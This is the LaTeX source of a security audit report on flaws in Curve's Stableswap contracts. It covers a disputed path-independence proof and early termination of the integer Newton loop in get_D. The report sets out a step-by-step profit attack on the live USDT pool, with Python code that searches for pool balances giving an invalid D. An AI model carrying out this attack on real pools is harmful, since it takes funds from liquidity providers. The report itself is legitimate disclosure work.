\documentclass{article}

%Define the listing package
\usepackage{listings} %code highlighter
\usepackage{color} %use color
\definecolor{mygreen}{rgb}{0,0.6,0}
\definecolor{mygray}{rgb}{0.5,0.5,0.5}
\definecolor{mymauve}{rgb}{0.58,0,0.82}
 
%Customize a bit the look
\lstset{ %
backgroundcolor=\color{white}, % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}
basicstyle=\footnotesize, % the size of the fonts that are used for the code
breakatwhitespace=false, % sets if automatic breaks should only happen at whitespace
breaklines=true, % sets automatic line breaking
captionpos=b, % sets the caption-position to bottom
commentstyle=\color{mygreen}, % comment style
deletekeywords={...}, % if you want to delete keywords from the given language
escapeinside={\%*}{*)}, % if you want to add LaTeX within your code
extendedchars=true, % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
frame=single, % adds a frame around the code
keepspaces=true, % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
keywordstyle=\color{blue}, % keyword style
% language=Octave, % the language of the code
morekeywords={*,...}, % if you want to add more keywords to the set
numbers=left, % where to put the line-numbers; possible values are (none, left, right)
numbersep=5pt, % how far the line-numbers are from the code
numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
rulecolor=\color{black}, % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
showspaces=false, % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
showstringspaces=false, % underline spaces within strings only
showtabs=false, % show tabs within strings adding particular underscores
stepnumber=1, % the step between two line-numbers. If it's 1, each line will be numbered
stringstyle=\color{mymauve}, % string literal style
tabsize=2, % sets default tabsize to 2 spaces
title=\lstname % show the filename of files included with \lstinputlisting; also try caption instead of title
}
%END of listing package%
 
\definecolor{darkgray}{rgb}{.4,.4,.4}
\definecolor{purple}{rgb}{0.65, 0.12, 0.82}
 
%define Javascript language
\lstdefinelanguage{JavaScript}{
keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
keywordstyle=\color{blue}\bfseries,
ndkeywords={class, export, boolean, throw, implements, import, this},
ndkeywordstyle=\color{darkgray}\bfseries,
identifierstyle=\color{black},
sensitive=false,
comment=[l]{//},
morecomment=[s]{/*}{*/},
commentstyle=\color{purple}\ttfamily,
stringstyle=\color{red}\ttfamily,
morestring=[b]',
morestring=[b]"
}
 
\lstset{
language=JavaScript,
extendedchars=true,
basicstyle=\footnotesize\ttfamily,
showstringspaces=false,
showspaces=false,
numbers=left,
numberstyle=\footnotesize,
numbersep=9pt,
tabsize=2,
breaklines=true,
showtabs=false,
captionpos=b
}

%Package for math fonts
\usepackage{amsfonts}

%To skip a line between paragraphs and avoid indentation
\usepackage{parskip}

%Package to change horizontal margins for a specific part using \begin{adjustwidth}{right change amount}{left change amount}
\usepackage{changepage}

%New environement to have first line of an enumerate list bold
\newcommand{\step}[1]{\item{\bfseries #1}}
\newcommand{\explanation}[1]{\par #1}
\newenvironment{steps}
  {\begin{enumerate}}
  {\end{enumerate}}

  %Sans-serif font, see https://tex.stackexchange.com/questions/2095/what-is-the-simplest-way-to-typeset-an-entire-document-in-sans-serif
\renewcommand{\familydefault}{\sfdefault}

\title{Audit report: flaws in the Curve contracts logic}
\author{experience, Killari}

\begin{document}
    \maketitle

    \section{Overview}

    In this document, we describe some flaws that affect all of the Curve pools contracts and might be exploitable by a profit seeking attacker under some conditions, or lead to user losses. Firstly, we note that the accepted proof of path independence for the Curve invariant provided by Angeris and Chitra is incorrect, meaning that a user cannot expect to get the exact same amount back from a back and forth trade even in the case of zero trade fees. Secondly, due to the way the Stableswap invariant is calculated, it is possible to change the composition of the pools to precise values found to break the computation. An attacker may make use of this flaw to effectively steal from the pool through repeated actions in a single transaction. Attached to this report, we provide a collection of scripts used to simulate the Curve contracts during our research, as well as an implementation of two exploits on a forked Ethereum mainnet chain: the loss of funds by a user doing repeated trades, and an attack yielding a small profit by adding and removing liquidity with precise values. While the latter attack profits are outweighted by the gas fees in the current state of the Ethereum network, they could be profitable were Curve to be implemented with the same logic on a cheap layer two network, or when the eth1 state is migrated to eth2.

    \section{Theory}

    \subsection{Stableswap basics}

    For context, we recall the theory of the Stableswap invariant and the way it is implemented in the Curve contracts. Curve is a what has been referred to as a "constant function market maker", or CFMM for short. As described in the original Stableswap paper \cite{stableswap2019}, Given a pool $\vec{x}$ composed of $n$ tokens with respective balances $x_{i}$, a user requesting to swap some amount $\Delta x_{i}$ of tokens $i$ for tokens $j$ should be given an amount $\Delta x_{j}$ such that the following equality remains true with the updated balances: 

    \begin{equation}
        A n^{n} \sum x_{i}+D=A D n^{n}+\frac{D^{n+1}}{n^{n} \prod x_{i}}
    \end{equation}

    Where $A$ is a fixed parameter called the ``amplification factor''. As we can see, it is implied that this equality was true to begin with. In particular, this means that the equation was set with an appropriate value of $D$. This is because as implied in the Stableswap paper, a $D$ that breaks this equality would not necessarily correspond to a spot price of $1$ when balances are close to each other. To do this, given an initial portfolio of tokens $\vec{x}$, we solve the equation $f(D) = 0$ where: 

    \begin{equation}
        f(D) = A n^{n} \sum x_{i}+D - A D n^{n} -\frac{D^{n+1}}{n^{n} \prod x_{i}}
    \end{equation}

    This is simply Equation 1 written differently. With this equation solved, we get the invariant for the current pools. As discussed above, finding the amount to give out given an amount in is also calculated by solving the invariant equation for the unknown quantity to give out. 

    \subsection{Path dependence}

    In their 2020 paper, Angeris and Chitra \cite{angeris2020} formalize CFMMs like Uniswap's constant product by introducing a \textit{trade function} $\varphi$. Under their formalism, if $\vec{x}$ is the vector representing the reserves, $\vec{\Delta}$ a vector representing the amounts in and $\vec{\Lambda}$ a vector representing the amounts out, a \textit{trade} is a set $\{\vec{\Delta}, \vec{\Lambda}\}$ such that:

    \begin{equation}
        \varphi(\vec{x}, \vec{\Delta}, \vec{\Lambda}) = \varphi(R, 0,0)
    \end{equation}

    They then proceed to define the Curve trading function as: 

    \begin{equation}
        \varphi(\vec{x}, \vec{\Delta}, \vec{\Lambda})=\alpha \mathbf{1}^{T}(\vec{x}+\gamma \vec{\Delta}-\vec{\Lambda})-\beta \prod_{i=1}^{n}\left(x_{i}+\gamma \vec{\Delta}_{i}-\vec{\Lambda}_{i}\right)^{-1}
    \end{equation}

    And they later state that this function verifies the sufficient condition that the set of possible trades can be written as: 

    \begin{equation}
        T(R)=\{(\Delta, \Lambda) \mid \psi(R+\Delta-\Lambda) \geq \psi(R)\}
    \end{equation}

    The issue in this reasoning lies in the definition of the Curve trading function. More specifically, the Stableswap invariant does not fall under this formalism, because there are no fixed $\alpha$ and $\beta$ such that one could always write a unique trading function as in Equation 3. Indeed, as discussed in Section 2.1, for each specific amount of tokens in the pool, a different D is calculated to make sure Equation 1 holds. This means that we cannot write the condition in Equation 5 above in that context, as a change of balance changes the value of D, and thus the function $\varphi$. 

    In the attached code, we prove this path dependence by showcasing a specific sequence of trades that leads to the user losing 5\% of the original amount they traded, far more than what they would expect to lose from the fees. We were not able to find a sequence of trades that would let the user effectively steal from the pool, but because of the lack of path independence property, this cannot be excluded unless we prove that any sequence of trades never leads to a higher amount out than the initial amount in.

    Nevertheless, this can be considered a flaw in the fundamental idea of Curve, as this is not the expected behavior. 

    \subsection{Invalid D calculations}
    
    The Curve contract attempts to find an appropriate value of D for a given set of current balances by solving the $f(D) = 0$ equation iteratively using the Newton method. Starting with an initial guess $D_{0}$, the next value of D is computed using the following sequence: 

    \begin{equation}
        D_{n+1} = D_{n} - \frac{f(D_{n})}{f'(D_{n})}
    \end{equation}

    This is done until $\| D_{n+1} - D_{n} \| < \varepsilon$ with some user defined $\varepsilon$ precision. It can be shown that the method either converges to a root of the function, that is, a value of D verifying our equation, or does not converge. The number of steps it takes to converge (if it does) is variable. Below is an example implementation of that algorithm in the Curve contracts from \verb {StableSwapUSDT.vy{ : \vspace{5mm}

    \begin{adjustwidth}{-50pt}{-50pt}
        \begin{lstlisting}[language=Python]
        def get_D(xp: uint256[N_COINS]) -> uint256:
            S: uint256 = 0
            for _x in xp:
                S += _x
            if S == 0:
                return 0
        
            Dprev: uint256 = 0
            D: uint256 = S
            Ann: uint256 = self.A * N_COINS
            for _i in range(255):
                D_P: uint256 = D
                for _x in xp:
                    D_P = D_P * D / (_x * N_COINS + 1)  # +1 is to prevent /0
                Dprev = D
                D = (Ann * S + D_P * N_COINS) * D / ((Ann - 1) * D + (N_COINS + 1) * D_P)
                # Equality with the precision of 1
                if D > Dprev:
                    if D - Dprev <= 1:
                        break
                else:
                    if Dprev - D <= 1:
                        break
            return D
        \end{lstlisting}
    \end{adjustwidth}

    As we can see, the algorithm uses 255 iterations, which normally should be enough to converge to a root of the function. But what if we converge to something other than a root of the function before the end of the loop? In $\mathbb{R}$, as stated before, that is not possible. But we see that this algorithm uses 256 bits unsigned integers and integers division. If we encounter any value $D_{i}$ such that $f(D_{i}) < f'(D_{i})$, the integers division will give 0 for $f(D_{n})/f'(D_{n})$, and we will have $D_{i+1} = D_{i}$, thus meeting the condition to terminate the loop before we arrive at an appropriate value. 

    One attack we found consists in finding functions $f$ (i.e. pool balances) that cause this early termination, making it so that \verb {get_D{ returns a value of D such that $f(D) \neq 0$. By adding and removing liquidity in sequence, we can in some cases get more out than we initially put in as a liquidity provider. While the profits we found do not offset the transaction fees in the current state of the Ethereum network, this could be considered a critical flaw in the logic of the Curve contracts which could be exploited if the gas fees were to be much lower, for example by migration to a layer two solution or after the migration of the eth1 state to eth2.

    \section{Set up of possible attacks or bugs}

    In this section we describe an attack based on manipulating a pool with a limited amount of liquidity to get an invalid D with the example of the current USDT pool which at the time of writing has reserves of ~228K DAI, ~718K USDC, ~547K USDT. 

    \begin{steps}
        \step{Find an unbalanced perturbation of the pool leading to an invalid D}
        \explanation{To do that, we replicate the \texttt{get\_D} function from the Curve contracts and we ``mine'' balances within that range that lead to an invalid D. Starting from an approximate \texttt{attack\_balance} to work with, we iteratively perturb it with the \texttt{uniform} function from the \texttt{random} package until we find a balances that give an incorrect value of D, i.e. a value of D such that $f(D) \neq 0$. Note that we look for an unbalanced pool because we found in our research that the resulting deviations between invalid and valid D are higher in that case.}
        
        \step{Add exactly enough liquidity to the pool so that we reach the balance found}

        \step{Trade the exact same amounts back and forth}
        \explanation{In the attacked example exploit, we're trading swapping some amount of cUSDC for cDAI, and then swapping the exact amount of cDAI obtained back to cUSDC. We start from a pool with invalid D, so it will give us some amount of cDAI for our cUSDC. When trading cUSDC back to cDAI, the new D is calculated. Since that new D will be valid with overwhelming probability, there will be a larger than normal discrepancy between  those two Ds, which allows us to get more cUSDC out of the operation than we started with.}

        \step{Repeat step 2 enough times to net a profit compensating for gas fees and flash loan fees}

        \step{Withdraw liquidity initially added}

        \explanation{Since we added liquidity to the pool in the first place, we were in part "stealing from ourselves" with the previous operations, but there is still some net profit left.}

    \end{steps}

    These steps can be repeated \textit{ad infinitum} until the point at which the pools would be very unbalanced after withdrawing liquidity, making the spot price significantly deviate from the ``reference'' spot price of 1 and allowing for a deadly arbitrage. Below is an excerpt from the Python script that let us find differences of amount given back compared to amount initially traded as high as 1\%! \vspace{5mm}

    \begin{adjustwidth}{-50pt}{-50pt}
        \begin{lstlisting}[language=Python]

        seed(None)

        while True: 

            #Assume 20M of each token available to be able to test many configurations 
            funds_avail_ctokens = [DollarsToCTokens(20000000, i) for i in range(N_COINS)]

            resetBalances()

            our_initial_balance = funds_avail_ctokens

            #Current balance of the USDT pool in CTokens

            cdai = current_ctokens[0]
            cusdc = current_ctokens[1]
            cusdt = current_ctokens[2]

            #Enter in USD values for easily understandable adjustments
            attack_balances_usd = [1000000,10000000,5000000]

            #Convert to CTokens
            attack_balances_c_tokens = [DollarsToCTokens(attack_balances_usd[0], 0), DollarsToCTokens(attack_balances_usd[1], 1), DollarsToCTokens(attack_balances_usd[2], 2)]

            #Perturb to find an invalid D
            attack_balances_c_tokens = [int(uniform(0.8,1)*attack_balances_c_tokens[0]), int(uniform(0.8,1)*attack_balances_c_tokens[1]), int(uniform(0.8,1)*attack_balances_c_tokens[2])]

            #Convert to TokensPrecision
            attack_balances_tokens_precision = [CTokensToTokensIncreasedPrecision(attack_balances_c_tokens[0], 0), CTokensToTokensIncreasedPrecision(attack_balances_c_tokens[1], 1), CTokensToTokensIncreasedPrecision(attack_balances_c_tokens[2], 2)]

            #Get D for this pool composition
            D = solver.get_D(attack_balances_tokens_precision, amp)
            
            #Check if the D found breaks the invariant
            u = USDTpool(attack_balances_tokens_precision, amp, D)

            #If D doesn't verify the invariant relationship
            if abs(u) > 0:

                #Find liquidity to add to get the invalid D found

                liquidityToAdd = [attack_balances_c_tokens[i] - current_ctokens[i] for i in range(N_COINS)]

                #Add liquidity into the original pool to get to the exact attack balances found 

                simAddLiquidity(liquidityToAdd)

                #Perform a swap of 40% the original amount of (c)USDC for (c)DAI into that new pool

                #Get amount in
                amountToTradeCUSDC = int(cusdc*0.4)

                #Get the amount out before changing the state of the pool
                amountOutCDAI = solver._exchange(1, 0, current_ctokens, amountToTradeCUSDC, rates, fee, amp)

                #Change state of the pool
                simTrade(1, 0, amountToTradeCUSDC) 

                #Trade the exact amount of (c)DAI obtained back to (c)USDC

                amountBackCUSDC = solver._exchange(0, 1, contract_balance, amountOutCDAI, rates, fee, amp)

                simTrade(0, 1, amountOutCDAI)

                if (amountBackCUSDC > 1.009*amountToTradeCUSDC or amountToTradeCUSDC > 1.009*amountBackCUSDC):

                    print("Solution found!")
        \end{lstlisting}
    \end{adjustwidth}

    The relevant functions used are fully documented in the code attached to this report.

\end{document}